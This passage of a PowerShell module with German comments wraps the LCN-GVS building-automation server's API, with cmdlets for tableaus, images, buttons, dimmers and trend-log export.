        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.CloseLCNGVSTableau))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:Tableau1Svc.CloseTableau($tableauSessionId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft die angegebenen Images ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die im LCN-GVS hinterlegten Bilder abrufen.
    .EXAMPLE
        Get-LCNGVSImage
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSImage # Alias: Get-Image
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSImage',
                  ConfirmImpact='Medium')]
    [Alias('Get-Image')]
    [OutputType([LCNGVS.Tableau.Image[]])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String[]] $imageName
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetImages))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Image = $Script:Tableau1Svc.GetImages($imageName)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Image
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Exportiert das angebene Bild.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein Bild auf einem Datentraeger speichern.
    .EXAMPLE
        Export-LCNGVSImage
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Export-LCNGVSImage # Alias: Save-Image
{

    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Export-LCNGVSImage',
                  ConfirmImpact='Medium')]
    [Alias('Save-Image')]
    [OutputType()]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$true,
                   Position=0,
                   ParameterSetName='Default')]
        [string] $Path, # '.\Unknown.png'

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$true,
                   Position=1,
                   ParameterSetName='Default')]
        [string] $DataBase64,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$true,
                   Position=0,
                   ParameterSetName='Image')]
        [LCNGVS.Tableau.Image] $Image
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.ExportImage))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    if ($PSCmdlet.ParameterSetName -eq 'Image')
                    {
                        $path = $Image.name.Split('/')[($Image.name.Split('/').Count -1)]
                        $path = '.\' + $path

                        $DataBase64 = $Image.DataBase64
                    }

                    $bytes = [Convert]::FromBase64String($DataBase64)
                    [IO.File]::WriteAllBytes($path, $bytes)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft das angegebene Steuerelement ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Steuerelemente eines Tableaus abrufen.
    .EXAMPLE
        Get-LCNGVSControl -TableauUri "Haus\Wohnzimmer" -Id 33
    .EXAMPLE
        Get-LCNGVSControl -TableauGroupName "Haus" -TableauId "Wohnzimmer" -Id 33
    .EXAMPLE
        Get-LCNGVSControl -TableauUri "Haus\Wohnzimmer" -ControlType Button
    .EXAMPLE
        Get-LCNGVSControl -TableauGroupName "Haus" -TableauId "Wohnzimmer" -ControlType Button
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSControl # Alias: Get-Control, Get-TableauControl, Get-LCNGVSTableauControl
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableauControl',
                  ConfirmImpact='Medium')]
    [Alias('Get-Control','Get-TableauControl','Get-LCNGVSTableauControl')]
    [OutputType([LCNGVS.Tableau.Control])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauGroupName,

        # Hilfebeschreibung zu Param2
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauId,

        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Uri')]
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Id2')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $TableauUri,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Uri')]
        [LCNGVS.Tableau.ControlType] $ControlType = [LCNGVS.Tableau.ControlType]::Unknown,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Id')]
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Id2')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $Id

    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }

        if ($pscmdlet.ParameterSetName -eq 'Uri' -or $pscmdlet.ParameterSetName -eq 'Id2')
        {
            [String[]] $string = $TableauUri.Split('\')
            $tableauGroupName = $string[0]
            $tableauId = $string[1]
        }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTableauControl))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Tableau = $Script:Tableau1Svc.OpenTableau($tableauGroupName, $tableauId)
                    if ($pscmdlet.ParameterSetName -eq "Default" -or $pscmdlet.ParameterSetName -eq "Uri")
                    {
                        $Controls = $Tableau.Controls | Where-Object -Property type -EQ -Value $ControlType
                    }
                    if ($pscmdlet.ParameterSetName -eq "Id" -or $pscmdlet.ParameterSetName -eq "Id2")
                    {
                        $Controls = $Tableau.Controls | Where-Object -Property id -EQ -Value $Id
                    }
                    $Script:Tableau1Svc.CloseTableau($Tableau.tableauSessionId) | Out-Null
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Controls
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Fragt einen neuen Status der angegebenen Steuerelemente.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie einen neuen Status der angegebenen Steuerelemente erfragen.
    .EXAMPLE
        Get-LCNGVSControlUpdateList
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSControlUpdateList # Alias: Poll-Updates
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSControlUpdates',
                  ConfirmImpact='Medium')]
    [Alias('Poll-Updates')]
    [OutputType([LCNGVS.Tableau.Control[]])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [int] $tableauSessionId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int[]] $updatedControls,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String[]] $updatedControlStringIds
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.PollUpdates))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Control = $Script:Tableau1Svc.PollUpdates($tableauSessionId,$updatedControls,$updatedControlStringIds)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Control
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Betaetigt die angegebene Schaltflaeche.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie eine Schaltflaeche auf einem im LCN-GVS eingerichteten Tableau betaetigen.
    .EXAMPLE
        Invoke-LCNGVSButton
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Invoke-LCNGVSButton # Alias: Submit-Button
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSButton',
                  ConfirmImpact='Medium')]
    [Alias('Submit-Button')]
    [OutputType([LCNGVS.Tableau.SubmitResult])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [int] $tableauSessionId,

        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $controllId
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.InvokeLCNGVSButton))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $SubmitResult = $Script:Tableau1Svc.SubmitButton($tableauSessionId, $controllId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $SubmitResult
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Stellt den Dimmer auf dem Tableau ein.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie einen Dimmer auf einem im LCN-GVS eingerichteten Tableau einstellen.
    .EXAMPLE
        Invoke-LCNGVSDimmer
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
#>
function Invoke-LCNGVSDimmer # Alias: Submit-Dimmer
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSDimmer',
                  ConfirmImpact='Medium')]
    [Alias('Submit-Dimmer')]
    [OutputType([LCNGVS.Tableau.SubmitResult])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [int] $tableauSessionId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $controllId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $positionInPercent
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.InvokeLCNGVSDimmer))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $SubmitResult = $Script:Tableau1Svc.SubmitDimmer($tableauSessionId, $controllId, $positionInPercent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $SubmitResult
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# -----------------------------------------------
# TrendLogs
# -----------------------------------------------

function Get-LCNGVSSupportedTrendLogSourceList
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSSupportedTrendLogSourceList',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSSupportedTrendLogSources')]
    [OutputType([LCNGVS.Tableau.TrendLogSource[]])]
    Param
    (
        [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
        [int] $busId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int] $segId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $modId
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSSupportedTrendLogSources))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TrendLogSources = $Script:Tableau1Svc.GetSupportedTrendLogSources($busId,$segId,$modId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLogSources
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Get-LCNGVSTrendLogItemList
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTrendLogItemList',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSTrendLogs')]
    [OutputType([LCNGVS.Tableau.TrendLogItem[]])]
    Param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TrendLogItem = $Script:Tableau1Svc.GetTrendLogs()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLogItem
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

# Der Export erfolgt im CSV-Format nach RFC 4180. Die Kodierung ist UTF-8, das Trennzeichen ist "Komma". Der MIME-Typ des Datei-Downloads ist "text/csv".
function Export-LCNGVSTrendLog
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Export-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias()]
    Param
    (
        [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
        [int] $busId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int] $segId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $modId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3)]
        [String] $source,

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=4)]
        [DateTime] $StartDate = ([DateTime]::Now).AddDays(-30),

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=5)]
        [DateTime] $EndDate = [DateTime]::Now
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.ExportLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    [Uri] $url = $Script:authSvc.Url
                    $BasisUrl = $url.Scheme + "://" + $url.Host + $url.Segments[0] + $url.Segments[1]
                    $BasisUrl = $BasisUrl + "TrendLogExport.aspx?busId=$($busId)&segId=$($segId)&modId=$($modId)&source=$($source)&start=$($StartDate.Year)-$($StartDate.Month.ToString('00'))-$($StartDate.Day.ToString('00'))&end=$($EndDate.Year)-$($EndDate.Month.ToString('00'))-$($EndDate.Day.ToString('00'))"
                    $webrequest = [System.Net.HTTPWebRequest]::Create($BasisUrl);
                    $webrequest.CookieContainer = $Script:authSvc.CookieContainer
                    $webrequest.Method = [Microsoft.PowerShell.Commands.WebRequestMethod]::Get
                    $response = $webrequest.GetResponse()
                    $responseStream = $response.GetResponseStream()
                    $streamReader = New-Object System.IO.Streamreader($responseStream)
                    $output = $streamReader.ReadToEnd()
                    return $output
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Open-LCNGVSTrendLog
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Open-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([String])]
    Param
    (
        [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
        [int] $busId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int] $segId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $modId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3)]
        [sring] $source,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=4)]
        [int] $logPeriodDays,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=5)]
        [int] $inactivityTimeoutSecs
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.OpenLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Guid = $Script:Tableau1Svc.OpenTrendLog($busId,$segId,$modId,$source,$logPeriodDays,$inactivityTimeoutSecs)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Guid
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Close-LCNGVSTrendLog
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Close-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [sring] $Id
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.CloseLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    [bool] $bool = $Script:Tableau1Svc.CloseTrendLog($Id)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $bool
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

function Get-LCNGVSTrendLogValueList
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSTrendLogValues')]
    [OutputType([LCNGVS.Tableau.TrendLog])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [string] $Id,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [DateTime] $start,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [DateTime] $end,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3)]
        [LCNGVS.Tableau.ScaleUnit] $scaleUnit,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=4)]
        [int] $intervalSecs
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"
